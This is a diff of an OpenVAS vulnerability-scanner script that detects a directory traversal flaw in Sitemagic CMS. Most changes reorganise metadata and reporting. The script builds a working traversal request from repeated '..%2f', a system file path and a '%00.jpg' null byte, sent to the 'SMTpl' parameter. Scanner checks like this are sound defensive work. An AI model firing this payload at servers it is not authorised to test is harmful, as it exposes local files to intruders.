@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_sitemagic_cms_dir_traversal_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
+# $Id: secpod_sitemagic_cms_dir_traversal_vuln.nasl 11192 2018-09-03 12:08:26Z cfischer $
 #
 # Sitemagic CMS 'SMTpl' Parameter Directory Traversal Vulnerability
 #
@@ -24,35 +24,16 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_impact = "Successful exploitation could allow an attacker to obtain
-arbitrary local files in the context of the web server process.
-
-Impact Level: Application";
-
-tag_affected = "Sitemagic CMS version 2010.04.17";
-
-tag_insight = "The flaw is due to improper sanitisation of user supplied input
-through the 'SMTpl' parameter in 'index.php'.";
-
-tag_solution = "No solution or patch was made available for at least one year
-since disclosure of this vulnerability. Likely none will be provided anymore.
-General solution options are to upgrade to a newer release, disable respective
-features, remove the product or replace the product by another one.";
-
-tag_summary = "This host is running Sitemagic CMS and is prone to directory
-traversal vulnerability.";
-
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.902452");
-  script_version("$Revision: 9351 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
+  script_version("$Revision: 11192 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-03 14:08:26 +0200 (Mon, 03 Sep 2018) $");
   script_tag(name:"creation_date", value:"2011-07-01 16:09:45 +0200 (Fri, 01 Jul 2011)");
   script_bugtraq_id(48399);
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
   script_name("Sitemagic CMS 'SMTpl' Parameter Directory Traversal Vulnerability");
-  script_tag(name:"qod_type", value:"remote_vul");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2011 SecPod");
   script_family("Web application abuses");
@@ -60,14 +41,29 @@ if(description)
   script_require_ports("Services/www", 80);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
-  script_tag(name : "impact" , value : tag_impact);
-  script_tag(name : "affected" , value : tag_affected);
-  script_tag(name : "insight" , value : tag_insight);
-  script_tag(name : "solution" , value : tag_solution);
-  script_tag(name : "summary" , value : tag_summary);
+  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/48399");
+  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/102498/sitemagic-traversal.txt");
+
+  script_tag(name:"impact", value:"Successful exploitation could allow an attacker to obtain
+  arbitrary local files in the context of the web server process.
+
+  Impact Level: Application");
+
+  script_tag(name:"affected", value:"Sitemagic CMS version 2010.04.17");
+
+  script_tag(name:"insight", value:"The flaw is due to improper sanitisation of user supplied input
+  through the 'SMTpl' parameter in 'index.php'.");
+
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
+Likely none will be provided anymore.
+General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
+
+  script_tag(name:"summary", value:"This host is running Sitemagic CMS and is prone to directory
+  traversal vulnerability.");
+
   script_tag(name:"solution_type", value:"WillNotFix");
-  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/48399/exploit");
-  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/102498/sitemagic-traversal.txt");
+  script_tag(name:"qod_type", value:"remote_vul");
+
   exit(0);
 }
 
@@ -76,34 +72,30 @@ include("http_func.inc");
 include("http_keepalive.inc");
 
 port = get_http_port(default:80);
-
 if(!can_host_php(port:port)){
   exit(0);
 }
 
+files = traversal_files();
+
 foreach dir( make_list_unique( "/Sitemagic", "/CMS", "/", cgi_dirs( port:port ) ) ) {
 
   if( dir == "/" ) dir = "";
-
   res = http_get_cache(item:string(dir, "/index.php"), port:port);
 
-  ## Confirm the application
-  if("<title>Sitemagic CMS</title>" >< res)
-  {
-    files = traversal_files();
+  if("<title>Sitemagic CMS</title>" >< res){
 
-    foreach file (keys(files))
-    {
-      ## Contstuct exploit string
-      url = string(dir,"/index.php?SMTpl=", crap(data:"..%2f",length:5*10),
-                   files[file], "%00.jpg");
+    foreach file (keys(files)){
 
-      ## Confirm exploit worked properly or not
-      if(http_vuln_check(port:port, url:url, pattern:file))
-      {
-        security_message(port:port);
+      url = string(dir, "/index.php?SMTpl=", crap(data:"..%2f", length:5*10), files[file], "%00.jpg");
+
+      if(http_vuln_check(port:port, url:url, pattern:file)){
+        report = report_vuln_url(port:port, url:url);
+        security_message(port:port, data:report);
         exit(0);
       }
     }
   }
 }
+
+exit(99);
